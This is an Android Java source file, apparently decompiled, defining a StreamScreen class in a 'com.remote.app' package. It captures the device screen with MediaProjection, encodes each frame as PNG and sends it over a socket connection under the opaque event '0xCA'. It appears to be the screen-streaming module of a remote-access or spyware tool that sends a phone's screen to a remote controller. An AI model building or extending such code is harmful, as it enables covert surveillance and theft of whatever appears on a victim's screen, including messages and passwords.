package com.remote.app.Managers;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.hardware.display.VirtualDisplay.Callback;
import android.media.Image;
import android.media.ImageReader;
import android.media.Image.Plane;
import android.media.ImageReader.OnImageAvailableListener;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.SystemClock;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import com.remote.app.IOSocket;
import com.remote.app.MainService;

import java.io.ByteArrayOutputStream;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;
import org.json.JSONObject;

public final class StreamScreen implements Runnable{

    private  Context ctx;
    private  Handler handler;
    private  int resultCode;
    private  Intent data;
    private static boolean flagStop;
    public static  StreamScreen.Companion Companion = new StreamScreen.Companion();

    private final void takeScreenShot() {
        if(MainService.isRecording==true)
            return;

        SystemClock.sleep(1000L);
        DisplayMetrics metrics = new DisplayMetrics();
        Object var10000 = this.ctx.getSystemService(Context.WINDOW_SERVICE);
        if (var10000 == null) {

        } else {
            WindowManager windowManager = (WindowManager)var10000;
            var10000 = this.ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (var10000 == null) {
            } else {
                MediaProjectionManager mgr = (MediaProjectionManager)var10000;
                windowManager.getDefaultDisplay().getMetrics(metrics);
                MediaProjection mMediaProjection = mgr.getMediaProjection(this.resultCode, this.data);
                ImageReader var7 = ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, 1, 2);

                ImageReader imgReader = var7;
                OnImageAvailableListener onImageAvailableListener = (OnImageAvailableListener)(new OnImageAvailableListener() {
                    public final void onImageAvailable(@Nullable ImageReader it) {
                        SystemClock.sleep(100L);
                        Image image = it != null ? it.acquireLatestImage() : null;
                        if (image != null) {
                            int mWidth = image.getWidth();
                            int mHeight = image.getHeight();
                            Plane[] planes = image.getPlanes();
                            Plane var10000 = planes[0];

                            ByteBuffer buffer = var10000.getBuffer();
                            var10000 = planes[0];

                            int pixelStride = var10000.getPixelStride();
                            var10000 = planes[0];

                            int rowStride = var10000.getRowStride();
                            int rowPadding = rowStride - pixelStride * mWidth;

                            Bitmap bitmap = Bitmap.createBitmap(mWidth + rowPadding / pixelStride, mHeight, Config.ARGB_8888);
                            bitmap.copyPixelsFromBuffer((Buffer)buffer);

                            ByteArrayOutputStream bos = new ByteArrayOutputStream();
                            bitmap.compress(Bitmap.CompressFormat.PNG, 90, bos);

                            JSONObject obj = new JSONObject();
                            try{
                                obj.put("image",false);
                                obj.put("streamScreen",true);
                                obj.put("name", "ScreenCast");
                                obj.put("image64",  bos.toByteArray());
                                obj.put("dataType", "screenCast");

                                IOSocket.getInstance().getIoSocket().emit("0xCA" , obj);
                            }
                            catch (Exception e){}
                        }

                        if (image != null) {
                            image.close();
                        }

                    }
                });
                mMediaProjection.createVirtualDisplay("ScreenCapture", metrics.widthPixels, metrics.heightPixels, metrics.densityDpi, 16, imgReader.getSurface(), (Callback)null, this.handler);
                imgReader.setOnImageAvailableListener(onImageAvailableListener, this.handler);

                if (flagStop) {
                    mMediaProjection.stop();
                    imgReader.setOnImageAvailableListener((OnImageAvailableListener)null, (Handler)null);
                }

            }
        }
    }

    public void run() {
        this.takeScreenShot();
    }

    public StreamScreen(@NotNull Context ctx, @NotNull Handler handler, int resultCode, @Nullable Intent data) {

        this.ctx = ctx;
        this.handler = handler;
        this.resultCode = resultCode;
        this.data = data;
    }

    public static final class Companion {
        public final boolean getFlagStop() {
            return StreamScreen.flagStop;
        }

        public final void setFlagStop(boolean var1) {
            StreamScreen.flagStop = var1;
        }

        private Companion() {
        }
    }
}
